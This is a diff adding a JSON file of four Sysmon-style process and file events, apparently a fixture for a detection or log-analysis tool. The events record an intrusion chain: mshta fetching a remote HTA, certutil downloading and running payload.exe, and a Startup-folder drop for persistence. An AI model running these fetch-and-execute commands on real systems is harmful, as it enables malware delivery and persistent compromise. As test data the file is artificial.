@@ -1,0 +1,78 @@
+[
+  {
+    "source": "sysmon",
+    "event_id": null,
+    "timestamp": "2026-06-25T14:02:03Z",
+    "host": "HR-PC-22",
+    "process": "C:\\Windows\\System32\\mshta.exe",
+    "command_line": "mshta.exe http://paste-bin-cdn.net/load.hta",
+    "user": "HR-PC-22\\kbrown",
+    "src_ip": null,
+    "dest_ip": null,
+    "raw": {
+      "EventID": 1,
+      "UtcTime": "2026-06-25T14:02:03Z",
+      "Computer": "HR-PC-22",
+      "Image": "C:\\Windows\\System32\\mshta.exe",
+      "CommandLine": "mshta.exe http://paste-bin-cdn.net/load.hta",
+      "User": "HR-PC-22\\kbrown"
+    }
+  },
+  {
+    "source": "sysmon",
+    "event_id": null,
+    "timestamp": "2026-06-25T14:02:09Z",
+    "host": "HR-PC-22",
+    "process": "C:\\Windows\\System32\\cmd.exe",
+    "command_line": "cmd.exe /c certutil.exe -urlcache -split -f http://paste-bin-cdn.net/payload.exe C:\\Users\\Public\\upd.exe",
+    "user": "HR-PC-22\\kbrown",
+    "src_ip": null,
+    "dest_ip": null,
+    "raw": {
+      "EventID": 1,
+      "UtcTime": "2026-06-25T14:02:09Z",
+      "Computer": "HR-PC-22",
+      "Image": "C:\\Windows\\System32\\cmd.exe",
+      "CommandLine": "cmd.exe /c certutil.exe -urlcache -split -f http://paste-bin-cdn.net/payload.exe C:\\Users\\Public\\upd.exe",
+      "User": "HR-PC-22\\kbrown"
+    }
+  },
+  {
+    "source": "sysmon",
+    "event_id": null,
+    "timestamp": "2026-06-25T14:02:21Z",
+    "host": "HR-PC-22",
+    "process": "C:\\Users\\Public\\upd.exe",
+    "command_line": "upd.exe",
+    "user": "HR-PC-22\\kbrown",
+    "src_ip": null,
+    "dest_ip": null,
+    "raw": {
+      "EventID": 1,
+      "UtcTime": "2026-06-25T14:02:21Z",
+      "Computer": "HR-PC-22",
+      "Image": "C:\\Users\\Public\\upd.exe",
+      "CommandLine": "upd.exe",
+      "User": "HR-PC-22\\kbrown"
+    }
+  },
+  {
+    "source": "sysmon",
+    "event_id": null,
+    "timestamp": "2026-06-25T14:02:25Z",
+    "host": "HR-PC-22",
+    "process": "C:\\Users\\Public\\upd.exe",
+    "command_line": "C:\\Users\\kbrown\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\sync.exe",
+    "user": "HR-PC-22\\kbrown",
+    "src_ip": null,
+    "dest_ip": null,
+    "raw": {
+      "EventID": 11,
+      "UtcTime": "2026-06-25T14:02:25Z",
+      "Computer": "HR-PC-22",
+      "Image": "C:\\Users\\Public\\upd.exe",
+      "CommandLine": "C:\\Users\\kbrown\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\sync.exe",
+      "User": "HR-PC-22\\kbrown"
+    }
+  }
+]
